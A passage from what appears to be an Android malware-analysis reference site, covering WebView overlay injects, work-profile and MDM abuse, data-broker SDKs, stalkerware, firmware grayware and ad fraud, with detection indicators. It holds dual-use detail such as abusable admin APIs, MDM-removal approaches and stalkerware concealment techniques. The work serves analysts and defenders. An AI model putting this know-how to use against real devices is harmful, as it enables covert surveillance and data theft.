to <code>true</code>"},{"location":"attacks/webview-exploitation/#families-using-this-technique","title":"Families Using This Technique","text":"<p>Banking trojans heavily rely on WebView for overlay attacks. Overlay injects are typically HTML/JavaScript pages loaded in a WebView positioned over the target banking app. The WebView loads HTML/CSS/JS inject templates from C2, styled to match the target app's login screen.</p> Family WebView Usage Notes Cerberus Overlay injects 300+ inject templates loaded via WebView Anubis Overlay injects WebView injects + embedded keylogger Octo Overlay injects WebView overlays combined with screen streaming Hook Overlay injects 400+ targets, WebView injects from C2 GodFather Dynamic overlays WebView loads per-target HTML dynamically Ermac Overlay injects Inherited Cerberus WebView inject system Hydra Overlay injects 400+ target WebView templates Xenomorph Overlay injects + ATS WebView inject kits with credential phishing TsarBot Overlay injects 750+ target inject templates Antidot Multi-language overlays WebView injects in 18 languages Harly Invisible WebView Loads subscription pages in hidden WebView, auto-clicks subscription confirmation Joker Invisible WebView Hidden WebView navigates premium subscription flows BTMOB RAT Credential phishing WebView-based login phishing <p>Harly and Joker use an inverted approach: instead of showing WebViews to the user, they run invisible WebViews in the background to complete subscription fraud flows without user interaction.</p>"},{"location":"attacks/work-profile-abuse/","title":"Work Profile Abuse","text":"<p>Exploiting Android Enterprise features to access corporate data, bypass MDM controls, or leverage enterprise APIs for malicious purposes. Work profiles create a separate managed environment on the device, but the isolation boundary has known weaknesses, and the powerful DPC APIs available to device administrators represent an attractive attack surface.</p> <p>Requirements</p> Requirement Details Capability Device Owner, Profile Owner, or access to cross-profile intents Target Enterprise-managed Android devices"},{"location":"attacks/work-profile-abuse/#android-enterprise-architecture","title":"Android Enterprise Architecture","text":""},{"location":"attacks/work-profile-abuse/#managed-profiles","title":"Managed Profiles","text":"<p>Android work profiles (introduced in Android 5.0) create a separate user space on the device with its own app instances, data storage, and encryption keys. The work profile runs under a distinct Linux user ID, providing process-level isolation from the personal profile.</p> Component Personal Profile Work Profile Linux user User 0 User 10+ (managed profile) App data <code>/data/user/0/</code> <code>/data/user/10/</code> Encryption Device credentials Separate work challenge (optional) App instances User-installed MDM-provisioned Contacts Personal contacts Corporate directory Clipboard Accessible Cross-profile copy restricted by policy"},{"location":"attacks/work-profile-abuse/#administration-modes","title":"Administration Modes","text":"Mode Scope Provisioning Capabilities Profile Owner (PO) Work profile only QR code, NFC, managed Google account App management, restrictions within work profile Device Owner (DO) Entire device Factory reset provisioning, zero-touch Full device control, all DPC APIs COPE (Company Owned, Personally Enabled) Device + work profile Factory reset provisioning DO on device, PO on work profile"},{"location":"attacks/work-profile-abuse/#device-policy-controller-dpc-apis","title":"Device Policy Controller (DPC) APIs","text":"<p>The <code>DevicePolicyManager</code> class exposes powerful APIs to profile/device owners:</p> API Capability Abuse Potential <code>setPasswordQuality()</code> Enforce password policy Force weak password for easier brute-force <code>resetPassword()</code> Set device password (deprecated API 26) Lock user out, set known password <code>wipeData()</code> Factory reset device Ransomware, evidence destruction <code>setKeyguardDisabled()</code> Disable lockscreen (DO only) Remove device protection <code>installCaCert()</code> Install trusted CA certificate MITM all TLS traffic <code>setAlwaysOnVpnPackage()</code> Force VPN Route all traffic through attacker VPN <code>addCrossProfileIntentFilter()</code> Allow intents across profiles Exfiltrate work data to personal apps <code>setScreenCaptureDisabled()</code> Disable screenshots Can also be enabled to allow capture <code>setCameraDisabled()</code> Disable camera Denial of service <code>addUserRestriction()</code> Restrict user actions Prevent uninstall, factory reset, USB debug <code>setPermissionGrantState()</code> Grant/deny permissions for managed apps Auto-grant dangerous permissions silently"},{"location":"attacks/work-profile-abuse/#cross-profile-data-access","title":"Cross-Profile Data Access","text":""},{"location":"attacks/work-profile-abuse/#intent-filters","title":"Intent Filters","text":"<p>By default, intents cannot cross the profile boundary. However, the DPC can add cross-profile intent filters using <code>addCrossProfileIntentFilter()</code>. Legitimate use: opening a work link in a personal browser. Malicious use: exfiltrating corporate data to personal-side malware.</p> <p>A malicious profile owner can configure filters to forward sensitive intents (containing URIs, file paths, or extras with corporate data) to apps in the personal profile where MDM has no visibility.</p>"},{"location":"attacks/work-profile-abuse/#content-provider-leakage","title":"Content Provider Leakage","text":"<p>Content providers are isolated per profile. However, several vectors allow cross-profile data access:</p> Vector Mechanism Impact Cross-profile intent with URI grant <code>FLAG_GRANT_READ_URI_PERMISSION</code> across profiles Read work-side content provider data Contacts provider Work contacts visible to personal dialer (by default) Corporate directory exposed Calendar provider Cross-profile calendar sharing (configurable) Meeting data leakage Clipboard Cross-profile paste allowed on some configurations Copy-paste data exfiltration"},{"location":"attacks/work-profile-abuse/#cve-2025-22442-apk-injection-into-work-profile","title":"CVE-2025-22442: APK Injection into Work Profile","text":"<p>Disclosed in April 2025, this vulnerability (rated HIGH) allowed a malicious user to install arbitrary APKs into the work profile during device activation. Present in Android 13, 14, and 15, the flaw existed for approximately 10 years before patching.</p> <p>During the work profile provisioning flow, a user could deliberately install any APK into the managed profile. The MDM cannot detect these unauthorized apps because the management agent has not yet completed setup. Installed apps then operate within the work profile with access to all corporate data the profile contains.</p>"},{"location":"attacks/work-profile-abuse/#mdm-exploitation-and-bypass","title":"MDM Exploitation and Bypass","text":""},{"location":"attacks/work-profile-abuse/#compromising-the-dpc","title":"Compromising the DPC","text":"<p>If an attacker gains control of the Device Policy Controller app itself, they inherit all DPC APIs. Attack vectors:</p> Vector Description DPC app vulnerability Bugs in the MDM agent (WebView RCE, insecure IPC) grant DPC privileges DPC communication intercept MITM between DPC and MDM server to inject malicious policies DPC replacement On rooted devices, replace the DPC with a trojanized version Provisioning intercept Intercept QR code or NFC provisioning to enroll a rogue MDM"},{"location":"attacks/work-profile-abuse/#removing-mdm","title":"Removing MDM","text":"<p>Users on BYOD devices can remove the work profile at any time (this is by design). On company-owned devices, device owner mode prevents removal, but:</p> Bypass Approach Factory reset Removes DO, but FRP (Factory Reset Protection) may prevent re-setup ADB <code>dpm remove-active-admin</code> Requires USB debugging enabled Bootloader unlock + reflash Destroys all data, defeats FRP Exploit privilege escalation Root access can remove DO programmatically CVE-2024-43093 Android privilege escalation (Android 11-14) could bypass system restrictions"},{"location":"attacks/work-profile-abuse/#silent-permission-granting","title":"Silent Permission Granting","text":"<p>A profile owner can use <code>setPermissionGrantState()</code> to silently grant runtime permissions to managed apps without any user interaction or dialog:</p> <pre><code>DevicePolicyManager dpm = getSystemService(DevicePolicyManager.class);\nComponentName admin = new ComponentName(this, MyDeviceAdmin.class);\n\ndpm.setPermissionGrantState(admin, \"com.managed.app\",\n    Manifest.permission.ACCESS_FINE_LOCATION,\n    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);\n</code></pre> <p>This is the only legitimate mechanism in Android for granting permissions without user consent. A compromised DPC can grant any runtime permission to any app in its managed profile silently.</p>"},{"location":"attacks/work-profile-abuse/#enterprise-targeted-malware","title":"Enterprise-Targeted Malware","text":""},{"location":"attacks/work-profile-abuse/#cerberus-mdm-awareness","title":"Cerberus MDM Awareness","text":"<p>Cerberus variants detected since 2024 include MDM detection logic. When the malware detects a managed device, it adapts its behavior:</p> <ul> <li>Avoids triggering DPC-enforced compliance checks</li> <li>Targets corporate banking and ERP apps found in work profiles</li> <li>Uses accessibility to interact with work-profile apps without triggering MDM alerts</li> </ul>"},{"location":"attacks/work-profile-abuse/#pegasus-and-enterprise-targets","title":"Pegasus and Enterprise Targets","text":"<p>Pegasus operates with zero-click exploits that bypass both personal and work profile isolation. On managed devices, Pegasus extracts data from both profiles because it operates at kernel level, below the profile isolation boundary. The NSO Group has specifically marketed Pegasus for targeting corporate executives and government officials whose devices run enterprise MDM.</p>"},{"location":"attacks/work-profile-abuse/#hermit","title":"Hermit","text":"<p>Hermit, attributed to Italian vendor RCS Lab, is an enterprise-grade spyware with approximately 25 downloadable modules. Deployed via ISP cooperation (network-level injection), it can operate regardless of work profile isolation because it achieves root access or exploits platform vulnerabilities to bypass sandboxing entirely.</p> <p>Hermit was deployed against government officials and business executives in Kazakhstan, Italy, and Syria. Its modular architecture allows post-deployment capability expansion, downloading only the modules needed for the specific target.</p>"},{"location":"attacks/work-profile-abuse/#byod-attack-surface","title":"BYOD Attack Surface","text":"<p>Bring Your Own Device deployments expand the attack surface because personal-side malware coexists on the same physical device as corporate data.</p> Attack Vector Impact Keylogging across profiles Accessibility service runs system-wide Capture work credentials typed in work apps Screen capture MediaProjection API or accessibility Record work app screens Clipboard monitoring System clipboard is shared (default on many configs) Intercept copied corporate data Network monitoring VPN or proxy on personal side Intercept work profile network traffic DNS manipulation Change DNS to attacker-controlled server Redirect corporate URLs <p>The accessibility service is particularly dangerous in BYOD because it operates at the system level, spanning both personal and work profiles. A malicious app installed on the personal side with accessibility enabled can read and interact with work profile app UIs.</p>"},{"location":"attacks/work-profile-abuse/#android-enterprise-security-model-limitations","title":"Android Enterprise Security Model Limitations","text":"Limitation Detail Accessibility spans profiles An accessibility service enabled system-wide can interact with both profiles VPN scope Personal-side VPN can capture work profile traffic if work profile has no separate VPN Hardware shared Camera, microphone, sensors are shared resources; personal malware can record during work use Notification shade Both profile notifications appear in the same notification shade Profile isolation is user-space Kernel exploits bypass profile boundaries entirely"},{"location":"attacks/work-profile-abuse/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>BIND_DEVICE_ADMIN</code> in manifest</li> <li><code>DevicePolicyManager</code> API calls in code</li> <li><code>addCrossProfileIntentFilter</code> usage</li> <li>Checks for <code>isProfileOwnerApp()</code> or <code>isDeviceOwnerApp()</code></li> <li>References to managed profile user IDs</li> </ul> Dynamic Indicators <ul> <li>DPC APIs invoked without legitimate enterprise context</li> <li>Cross-profile intents observed carrying sensitive data</li> <li>Permission grants via <code>setPermissionGrantState</code> without user interaction</li> <li>CA certificate installation without user consent</li> </ul>"},{"location":"attacks/work-profile-abuse/#cross-references","title":"Cross-References","text":"<ul> <li>Device Admin Abuse -- device admin API exploitation (predecessor to Android Enterprise)</li> <li>Accessibility Abuse -- accessibility spans the profile boundary, enabling cross-profile attacks</li> <li>Persistence Techniques -- device owner mode is the strongest persistence mechanism on Android</li> <li>Pegasus -- operates below profile isolation via kernel exploits</li> <li>Hermit -- enterprise-targeted modular spyware</li> </ul>"},{"location":"grayware/","title":"Grayware &amp; Data Harvesting","text":"<p>The boundary between aggressive monetization and spyware is not a line but a gradient. Grayware encompasses apps that are not classified as malware by most engines but engage in systematic data collection, user tracking, deceptive billing, or surveillance capabilities sold as legitimate products. AV engines flag these as PUP (Potentially Unwanted Program) or riskware. For analysts, the question \"is this malware?\" often lands here, and the answer depends on jurisdiction, intent, and how much you trust a privacy policy written by a data broker's lawyer.</p>"},{"location":"grayware/#data-broker-sdks","title":"Data Broker SDKs","text":"<p>Third-party SDKs embedded in otherwise legitimate apps that silently collect and sell user data. The app developer integrates the SDK in exchange for per-device-per-month payments. The SDK harvests device data in the background. The data flows to brokers, advertisers, and in documented cases, government agencies.</p>"},{"location":"grayware/#how-sdk-monetization-works","title":"How SDK Monetization Works","text":"<ol> <li>SDK vendor approaches app developer with monetization offer</li> <li>Developer integrates SDK (usually a few lines in Gradle + manifest entries)</li> <li>SDK activates on app launch, begins collecting permitted data</li> <li>Data uploaded to SDK vendor's servers on a schedule or in real time</li> <li>Vendor aggregates data across all apps embedding their SDK</li> <li>Aggregated datasets sold to data brokers, analytics firms, advertisers, and government contractors</li> <li>Developer receives payment based on active device count (typically $0.01-$0.05 per device per month)</li> </ol>"},{"location":"grayware/#what-they-collect","title":"What They Collect","text":"Data Type Method Notes GPS location (continuous) <code>ACCESS_FINE_LOCATION</code> / <code>ACCESS_BACKGROUND_LOCATION</code> High-frequency polling, often every few minutes WiFi SSIDs and BSSIDs WiFi scan APIs Enables indoor positioning and location inference without GPS Bluetooth beacons Bluetooth scan APIs Proximity detection, retail analytics Installed apps list <code>QUERY_ALL_PACKAGES</code> or <code>PackageManager</code> App usage profiling, interest inference Device identifiers AAID, IMEI (pre-Android 10), MAID Cross-app and cross-device tracking Contacts <code>READ_CONTACTS</code> Social graph mapping Accelerometer / gyroscope Sensor APIs Activity recognition, transport mode detection Browsing history Accessibility service or custom browser SDK Interest profiling"},{"location":"grayware/#documented-cases","title":"Documented Cases","text":"<p>X-Mode (now Outlogic): Collected location data from 400+ apps including Muslim prayer apps (Muslim Pro, Muslim Mingle) and dating apps. Data sold to US military contractors and defense agencies. The Wall Street Journal exposed the pipeline in 2020. Google and Apple required X-Mode removal from all apps in early 2021. X-Mode rebranded to Outlogic and was acquired by Digital Envoy. FTC banned X-Mode from selling sensitive location data in January 2024.</p> <p>Measurement Systems SDK: Discovered by AppCensus researchers in 60M+ downloads across weather apps, highway radar apps, QR scanners, and religious apps. The SDK collected phone numbers, email addresses, exact location, nearby WiFi and Bluetooth device information, and clipboard contents. Registered to a Virginia company (Vostrom Holdings) linked to a US defense contractor (Packet Forensics) with a history of selling lawful intercept equipment to governments. Google removed the SDK from Play Store in April 2022, but some apps reintegrated it later.</p> <p>Patternz: Israeli surveillance company (run by ISA, Nuviad's parent) using SDK data from popular apps for intelligence purposes. Patternz's pitch deck claimed access to data from 600,000 apps, enabling tracking of nearly any mobile user globally. ISA operated a legitimate ad network (Nuviad) that served as the data collection front. The system exploited the real-time bidding ad ecosystem to harvest device data without embedding SDKs directly.</p> <p>Predicio / Gravy Analytics: French data broker Predicio and US-based Gravy Analytics collected location data through SDK partnerships and the real-time bidding (RTB) ad ecosystem. Gravy Analytics was hacked in January 2025, exposing location data for millions of devices globally. The hacker posted a 1.4 GB fragment containing approximately 30 million records, claiming the full stolen database was 17 terabytes (potentially 200+ billion records). The leaked data included coordinates from apps like Tinder, Grindr, Candy Crush, and various pregnancy tracking apps, with researchers able to track individuals from workplaces to their homes.</p>"},{"location":"grayware/#sdk-identification","title":"SDK Identification","text":"<p>When analyzing a suspect app, identify embedded SDKs through:</p> Indicator Location Package names <code>com.xmode.sdk</code>, <code>io.huq</code>, <code>com.cuebiq</code>, <code>com.safegraph</code>, <code>com.predicio</code>, <code>com.tutela</code>, <code>com.measurementsys</code> Manifest receivers/services Look for services not attributable to the app's core functionality Network traffic Connections to <code>api.xmode.io</code>, <code>sdk.huq.io</code>, <code>ingest.cuebiq.com</code>, known broker endpoints Gradle dependencies Check <code>build.gradle</code> for SDK artifact references String artifacts API keys, SDK initialization tokens in resources or <code>BuildConfig</code>"},{"location":"grayware/#real-time-bidding-as-surveillance","title":"Real-Time Bidding as Surveillance","text":"<p>The programmatic advertising ecosystem leaks granular user data at industrial scale -- not through SDK abuse, but through the normal functioning of the ad auction system. Every time an ad loads in an Android app, the device broadcasts a bid request containing device identifiers, GPS coordinates, IP address, app name, device model, carrier information, and more. This data reaches hundreds of demand-side platforms (DSPs) in milliseconds, most of which do not win the auction but retain the data.</p>"},{"location":"grayware/#how-rtb-data-leaks-work","title":"How RTB Data Leaks Work","text":"<p>The OpenRTB protocol defines the bid request format. When an app displays an ad, the supply-side platform (SSP) sends a bid request to potentially hundreds of DSPs. Each bid request contains:</p> Field Data Privacy Impact <code>device.geo.lat/lon</code> GPS coordinates (often to 6 decimal places) Meter-level location tracking <code>device.ifa</code> Advertising ID (GAID/IDFA) Persistent cross-app identifier <code>device.ip</code> IP address Approximate location, ISP identification <code>device.model</code> Device model + manufacturer Device fingerprinting <code>device.carrier</code> Mobile carrier name Network identification <code>app.bundle</code> App package name Activity inference (health, dating, political apps) <code>user.data</code> Interest segments, demographics Behavioral profiling <p>The Irish Council for Civil Liberties (ICCL) reported that US users' online activity and location are broadcast 747 times per day on average through RTB, and European users 376 times per day. This data reaches thousands of companies per broadcast.</p>"},{"location":"grayware/#intelligence-agencies-buying-bid-stream-data","title":"Intelligence Agencies Buying Bid Stream Data","text":"<p>RTB data is commercially available for purchase without a warrant. Senator Ron Wyden's investigation confirmed that the NSA purchased internet metadata and phone location data commercially. The data pipeline enables what privacy researchers call a \"Fourth Amendment workaround\" -- agencies buy commercially what they would need a warrant to collect directly.</p> <p>Rayzone Group (Israel): Operates a DSP called \"Echo\" that participates in RTB auctions not to buy ads, but to harvest bid stream data for surveillance purposes. Revealed by Haaretz in 2020, Rayzone could geolocate any device whose apps participate in RTB auctions.</p> <p>Intellexa \"Aladdin\": Leaked internal documents from the December 2025 Intellexa breach revealed a system called Aladdin that uses the ad ecosystem to deliver zero-click spyware infections. The system places a \"bid\" in the ad auction, wins, and delivers an exploit payload disguised as ad creative. This weaponizes the entire RTB infrastructure as a spyware delivery mechanism.</p>"},{"location":"grayware/#government-purchases-of-location-data","title":"Government Purchases of Location Data","text":"<p>Government agencies purchase commercially available location data from brokers, bypassing the warrant requirements established in Carpenter v. United States (2018) where the Supreme Court ruled that accessing historical cell-site location records requires a warrant.</p> Agency / Company Data Source Scale Source Fog Data Science Commercial apps via brokers Billions of data points, sold to 18+ US law enforcement agencies EFF, AP Venntel (Gravy Analytics subsidiary) Location data brokers Sold to IRS-CI, CBP, ICE WSJ Babel Street / Locate X Ad ecosystem location data Used by DHS, CBP, Secret Service EFF NSA Internet metadata + phone location Bulk purchasing confirmed by Wyden inquiry Wyden press release <p>Fog Data Science is notable for its low price point: subscriptions start under $10,000, making mass surveillance accessible to local police departments. The Wyden letter to DOJ questioned whether these purchases constitute a Fourth Amendment workaround, but no court has definitively ruled on the practice.</p>"},{"location":"grayware/#predatory-lending-apps-spyloan","title":"Predatory Lending Apps (SpyLoan)","text":"<p>Apps offering quick microloans that demand excessive permissions, then weaponize collected data for extortion when borrowers cannot repay. Detailed technical analysis in the dedicated family page: SpyLoan.</p>"},{"location":"grayware/#business-model","title":"Business Model","text":"<ol> <li>Target users in regions with limited formal banking access (India, Southeast Asia, Latin America, Africa)</li> <li>Offer instant loan approval through Google Play apps with polished UI</li> <li>Request contacts, camera, SMS, location, storage during \"verification\"</li> <li>Approve microloans at 300-500% APR with hidden fees</li> <li>When borrowers miss payments: contact their entire phone book with threatening messages, share personal photos, send fake legal notices to employers</li> <li>Data exfiltration begins immediately on permission grant, retained server-side even if app is uninstalled</li> </ol>"},{"location":"grayware/#scale-and-impact","title":"Scale and Impact","text":"<p>Google removed 2000+ SpyLoan apps from Play Store between 2023 and 2024. Targeting concentrates in India, Philippines, Indonesia, Kenya, Nigeria, Mexico, and Colombia. Documented suicide cases linked to SpyLoan harassment campaigns in India, the Philippines, and Kenya. McAfee reported a 75% increase in SpyLoan infections between Q2 and Q3 2024.</p>"},{"location":"grayware/#stalkerware-spouseware","title":"Stalkerware / Spouseware","text":"<p>Commercial surveillance apps marketed for \"parental monitoring\" or \"employee tracking\" but predominantly used for intimate partner surveillance. These are sold openly with customer support, subscription billing, and terms of service, yet provide capabilities identical to state-sponsored spyware.</p>"},{"location":"grayware/#major-stalkerware-products","title":"Major Stalkerware Products","text":"Product Price Status mSpy $30-70/month Active, one of the largest operators FlexiSpy $70-200/month Active, premium tier with call interception Cocospy / Spyic $40-50/month Active, same parent company (1TopSpy) TheTruthSpy $20-30/month Breached in 2022, 60GB of victim photos/data exposed pcTattletale $100/year Hacked and shut down in 2024 LetMeSpy Free-$6/month Breached and shut down in 2023 SpyFone ~$100/year Banned by FTC in 2021"},{"location":"grayware/#technical-capabilities","title":"Technical Capabilities","text":"Capability Implementation Real-time GPS tracking Background location service with ACCESS_BACKGROUND_LOCATION Call recording Audio recording during calls via RECORD_AUDIO SMS/MMS reading READ_SMS content provider monitoring Social media monitoring Accessibility service reads screen content from WhatsApp, Instagram, Snapchat Ambient microphone Silent RECORD_AUDIO activation on command Keylogging Accessibility service captures all text input Screenshot capture Screen capture at intervals or on demand Browser history Read browser content providers or accessibility scraping Camera capture Silent CAMERA activation"},{"location":"grayware/#installation-and-concealment","title":"Installation and Concealment","text":"<p>Requires physical access to the target device. Installers guide the abuser through disabling Play Protect, enabling unknown sources, granting all permissions, then activating device administrator. After installation:</p> <ul> <li>App icon hidden from launcher (removed from <code>CATEGORY_LAUNCHER</code>)</li> <li>Process name disguised as system component (\"System Service\", \"Battery Optimizer\", \"Sync Service\")</li> <li>Runs as a foreground service with a blank or misleading notification</li> <li>Registered as device administrator to resist uninstallation</li> <li>RECEIVE_BOOT_COMPLETED for persistence across reboots</li> </ul>"},{"location":"grayware/#detection","title":"Detection","text":"<ul> <li>Hidden accessibility services with generic names</li> <li>Elevated battery consumption from continuous location and sensor polling</li> <li>Background data usage to stalkerware C2 servers</li> <li>Device administrator registered to unknown app</li> <li>Coalition Against Stalkerware maintains detection signatures shared with AV vendors</li> <li>Check <code>Settings &gt; Accessibility &gt; Installed Services</code> for unknown entries</li> <li>Check <code>Settings &gt; Security &gt; Device admin apps</code> for apps not installed by user</li> </ul>"},{"location":"grayware/#data-breaches","title":"Data Breaches","text":"<p>Stalkerware companies are frequent breach targets because they store massive datasets of intimate victim data with poor security:</p> <ul> <li>TheTruthSpy (2022): 60GB of victim photos, audio recordings, and messages exposed</li> <li>LetMeSpy (2023): Entire database leaked, company shut down</li> <li>pcTattletale (2024): Hacked, data exposed, company permanently closed</li> <li>SpyFone (2021): FTC ordered data deletion, banned from surveillance industry</li> <li>mSpy (2015, 2018): Breached twice, millions of customer records exposed</li> </ul>"},{"location":"grayware/#pre-installed-firmware-grayware","title":"Pre-installed Firmware Grayware","text":"<p>Malware and data-harvesting code embedded in Android device firmware during manufacturing. Unlike app-level grayware, firmware-level infections cannot be removed by the user, persist across factory resets, and operate with system-level privileges. The budget Android supply chain is structurally compromised: economic pressure on firmware suppliers creates incentives for malware bundling.</p>"},{"location":"grayware/#documented-cases_1","title":"Documented Cases","text":"<p>ADUPS / Shanghai Adups Technology Co. (2016): Discovered by Kryptowire, ADUPS provided commercial FOTA (Firmware Over The Air) update software claiming 700 million active users across 150+ countries. The most prominent affected device was the BLU R1 HD, sold through Amazon and Best Buy. The backdoor was purposefully installed, not a vulnerability exploit. Every 72 hours, data was exfiltrated to Chinese servers (<code>bigdata.adups.com</code>): full SMS message bodies, contact lists, call history with full telephone numbers, IMSI and IMEI identifiers, and GPS location. A secondary server (<code>rebootv5.adsunflower.com</code>) could issue remote commands with elevated privileges. Neither data collection application could be disabled by end users. ADUPS subsequently affected 43 phone vendors.</p> <p>Chamois (2017-2019): Google-discovered ad fraud botnet pre-installed in firmware on 21M+ devices. Operated through the supply chain, with malicious code embedded during manufacturing. Generated fraudulent ad revenue through background ad clicks and premium SMS.</p> <p>Cosiloon (2018): Avast discovered pre-installed adware on 100+ low-cost Android device models from ZTE, Archos, myPhone, and others. The dropper was firmware-level, survived even after payload removal, and used strong obfuscation. Active for at least three years before discovery. Most affected devices were not Google-certified.</p> <p>Triada in firmware (2019): Google confirmed that Triada was pre-installed in the firmware of budget Android phones during the manufacturing process. A supply chain vendor injected the malware into the system image. Triada operated at the framework level with system privileges, injecting code into every running app process.</p> <p>Gionee trojan (2020): Over 20 million smartphones infected intentionally between December 2018 and October 2019. Gionee's subsidiary Shenzhen Zhipu Technology implanted a trojan via the \"Story Lock Screen\" app, using a system called the \"Dark Horse Platform\" to manage the malware. Executives were convicted and sentenced to 3-3.5 years in prison with CNY 200,000 fines, having profited approximately $4.2 million from ad fraud.</p> <p>Lemon Group / \"Guerrilla\" (2023): Trend Micro presented at Black Hat Asia 2023 that 8.9 million Android devices across 180 countries were pre-infected. 55% of victims in Asia, 17% in North America. The malware included an SMS plugin (intercepting OTPs for WhatsApp, Facebook), a proxy plugin (selling victim bandwidth as residential proxies), a cookie plugin (hijacking Facebook and WhatsApp sessions), and a silent app installer. Firmware prices had dropped to zero due to competition among distributors, who began bundling \"silent plugins\" as monetization. Lemon Group rebranded as \"Durian Cloud SMS\" after exposure. Overlapping C2 infrastructure indicated collaboration with Triada operators.</p>"},{"location":"grayware/#why-firmware-grayware-persists","title":"Why Firmware Grayware Persists","text":"<p>The economics are straightforward: budget Android device manufacturers outsource firmware to third-party suppliers. These suppliers face razor-thin margins and monetize through embedded SDKs, adware, and data collection. Google certification (CTS/Play Protect) blocks this on certified devices, but most affected phones are uncertified models sold through online marketplaces in developing markets. The user has no technical means to remove firmware-level malware without flashing a clean ROM, which requires technical knowledge and unlocked bootloaders that budget manufacturers rarely provide.</p>"},{"location":"grayware/#childrens-app-data-harvesting","title":"Children's App Data Harvesting","text":"<p>Children's apps represent a high-value target for data harvesting SDKs because children cannot meaningfully consent, parents are rarely informed, and the apps are free (monetized entirely through data extraction).</p>"},{"location":"grayware/#coppa-violation-scale","title":"COPPA Violation Scale","text":"<p>A landmark 2018 study by ICSI Berkeley researchers (\"Won't Somebody Think of the Children?\") analyzed 5,855 of the most popular free children's apps on Google Play:</p> Finding Percentage Apps potentially violating COPPA 57% Apps sharing persistent identifiers against Google ToS 39% (2,281 apps) Apps collecting PII via SDKs whose own terms prohibit use in children's apps 19% Apps harvesting location or contact data without parental consent 5% <p>1,280 children's apps contained the Facebook SDK. 318 transmitted data to Kochava (attribution/ad measurement provider). Most apps with COPPA-compliant SDK options either did not enable them or incorrectly propagated settings across mediation SDKs.</p>"},{"location":"grayware/#enforcement","title":"Enforcement","text":"<p>\"Operation Child Tracker\" (2016): New York AG investigation targeting Viacom ($500,000), Mattel ($250,000), JumpStart ($85,000), and Hasbro for tracking children's online activity illegally through their apps (Nick Jr., Barbie, Hot Wheels, Neopets). Combined penalties: $835,000.</p> <p>Disney/Viacom class action: SDK companies named as defendants included AdColony, Chartboost, Flurry, InMobi, ironSource, Tapjoy, Vungle, Unity Technologies, Comscore, and Upsight -- all for placing tracking software in children's apps. Settled in 2020.</p> <p>FTC v. Disney (2025): $10 million civil penalty for failing to properly label child-directed YouTube videos, enabling YouTube to collect children's personal data for targeted advertising.</p> <p>Tekya malware (2020, Check Point) infected 56 Google Play apps with over 1 million combined downloads. 24 of the infected apps were children's games. The ad fraud clicker used native code (<code>MotionEvent</code> API) to simulate user taps on ads.</p>"},{"location":"grayware/#advertising-fraud","title":"Advertising Fraud","text":"<p>Apps that generate fake ad impressions, clicks, or installs in the background to steal advertising revenue. Not data theft but device abuse at the expense of battery, bandwidth, and advertiser budgets.</p>"},{"location":"grayware/#fraud-types","title":"Fraud Types","text":"Type Mechanism Detection Signal Click injection Listens for <code>PACKAGE_ADDED</code> broadcast, injects attribution click before new app finishes installing <code>PACKAGE_ADDED</code> receiver + immediate HTTP request to attribution URL Ad stacking Multiple invisible ads loaded behind a single visible ad Multiple ad SDK network calls per visible impression Pixel stuffing Ads loaded in 1x1 pixel containers, invisible to user Tiny WebView or ImageView with ad network traffic Background ad rendering Hidden WebView loads and \"views\" ads with screen off WebView activity without corresponding UI, battery drain Click flooding Mass generation of fake ad clicks to poison attribution data High-volume HTTP requests to ad tracking endpoints SDK spoofing Forge ad impressions by replaying legitimate SDK traffic patterns Network traffic mimicking ad SDK protocols without actual ad display"},{"location":"grayware/#notable-cases","title":"Notable Cases","text":"<p>Grabos (2017): McAfee discovered 144 trojanized apps on Google Play running a pay-per-install scam. First found in \"Aristotle Music audio player 2017,\" 34 analyzed apps had an average 4.4 rating with 4.2-17.5M downloads. A commercial obfuscator protected the malicious code, making it difficult to detect without runtime analysis.</p> <p>Chamois (2017-2019): Google-discovered ad fraud botnet pre-installed in firmware on 21M+ devices. Operated through the supply chain, with malicious code embedded during manufacturing. Generated fraudulent ad revenue through background ad clicks and premium SMS.</p> <p>Judy (2017): Ad click malware in 41 apps from a Korean developer on Google Play. Used a C2 server to deliver JavaScript payloads that clicked ads via WebView. Estimated 8.5M-36.5M infected devices.</p> <p>DrainerBot (2019): SDK embedded in 10M+ downloads that downloaded video ads in the background, consuming 10GB+ of mobile data per month per device. Users experienced massive data charges and battery drain with no visible cause.</p> <p>LeifAccess (2019): McAfee documented a trojan abusing accessibility services to post fake Google Play reviews and simulate legitimate ad clicks. Loaded ads via floating overlays and direct ad-network links, combining ad fraud with review manipulation.</p> <p>Tekya (2020): Auto-clicker malware in 56 Google Play apps (24 children's apps). Used <code>MotionEvent</code> API to simulate legitimate ad clicks. Check Point documented the use of Android's <code>MotionEvent.obtain()</code> to generate touch events programmatically.</p> <p>HiddenAds (2020-2022): McAfee tracked multiple HiddenAds campaigns affecting 1M+ users via Google Play cleaner apps. The malware ran malicious ad services automatically on installation without requiring user launch, then changed its icon to the Google Play icon and renamed itself \"Google Play\" or \"Setting\" to hide from the user. A separate campaign infected 38 games reaching 35M+ users.</p> <p>Clicker (2022): McAfee found 16 clicker apps on Google Play with 20M+ combined downloads using the <code>com.click.cas</code> and <code>com.liveposting</code> libraries. The malware delayed activation by over an hour after installation and paused when the user was actively using the device, making detection through manual testing nearly impossible.</p> <p>Invisible Adware (2023): McAfee uncovered 43 apps on Google Play with 2.5M downloads that loaded ads only when the device screen was off. The apps waited multiple weeks after installation before activating and requested \"power saving exclusion\" and \"draw over other apps\" permissions to maintain background execution.</p>"},{"location":"grayware/#technical-indicators","title":"Technical Indicators","text":"<ul> <li><code>PACKAGE_ADDED</code> broadcast receiver (click injection vector)</li> <li><code>MotionEvent.obtain()</code> or <code>dispatchTouchEvent()</code> calls without user interaction</li> <li>Hidden or zero-dimension <code>WebView</code> instances</li> <li>Abnormal battery drain and background data consumption</li> <li>Ad SDK network traffic volume disproportionate to app usage</li> <li>Wake locks held during screen-off periods for background rendering</li> </ul>"},{"location":"grayware/#notification-ad-injection","title":"Notification &amp; Ad Injection","text":"<p>Apps that monetize by injecting ads outside their own UI context -- into the notification shade, lock screen, or as system-level overlays.</p>"},{"location":"grayware/#techniques","title":"Techniques","text":"Technique Implementation Android Restrictions Notification ads High-priority notifications with ad content, mimicking system alerts Android 8.0+ notification channels; Android 13+ <code>POST_NOTIFICATIONS</code> permission Lock screen ads Custom lock screen replacement or overlay drawn via <code>SYSTEM_ALERT_WINDOW</code> Android 6.0+ requires explicit grant; Android 10+ overlay touch restrictions Full-screen interstitials <code>SYSTEM_ALERT_WINDOW</code> overlays triggered on screen 